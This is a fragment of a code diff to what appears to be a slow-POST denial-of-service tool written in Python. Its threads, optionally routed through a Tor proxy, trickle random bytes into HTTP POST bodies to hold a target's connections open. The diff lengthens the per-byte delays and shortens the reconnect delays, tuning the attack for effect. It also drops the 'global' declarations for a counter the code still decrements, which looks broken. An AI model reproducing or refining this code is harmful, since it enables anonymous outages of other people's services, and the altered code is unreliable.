@@ -48,15 +48,12 @@ class HttpPostThread(Thread):
             self.socket.set_proxy(socks.SOCKS5, '127.0.0.1', 9150)
 
     def _log(self, msg):
-        global live_connections
         print(f'[{live_connections} live connections, thread #{self.thread_id}] {msg}')
 
     def _format_error_message(self, err):
         return err.msg if hasattr(err, 'msg') else f'{err.errno} {err.strerror}'
 
     def _send_http_post(self):
-        global live_connections
-
         dynamic_payload_length = random.randint(5000, 10000)
         total_payload_length = dynamic_payload_length + len(json_prefix) + len(json_postfix) if self.content_type == 'application/json' else dynamic_payload_length
         headers_list = [
@@ -84,7 +81,7 @@ class HttpPostThread(Thread):
             p = random.choice(string.ascii_letters + string.digits)
             # self._log(f'Sending: {p} ({i + 1}/{dynamic_payload_length})')
             self.transport.send(p.encode())
-            time.sleep(random.uniform(0.5, 4))
+            time.sleep(random.uniform(0.5, 8))
         if self.content_type == 'application/json':
             # self._log(f'Sending {json_postfix}')
             self.transport.send(json_postfix.encode())
@@ -107,7 +104,7 @@ class HttpPostThread(Thread):
                 except Exception as e:
                     self._log(f'Error connecting to {self.host}:{self.port}: {self._format_error_message(e)}')
                     self._init_socket()
-                    time.sleep(1)
+                    time.sleep(0.5)
 
             while self.running:
                 try:
@@ -117,7 +114,7 @@ class HttpPostThread(Thread):
                     self._log(f'Connection closed, error: {self._format_error_message(e)}. Restarting...')
                     self.transport.close()
                     self._init_socket()
-                    time.sleep(1)
+                    time.sleep(0.5)
                     break
                 finally:
                     live_connections -= 1
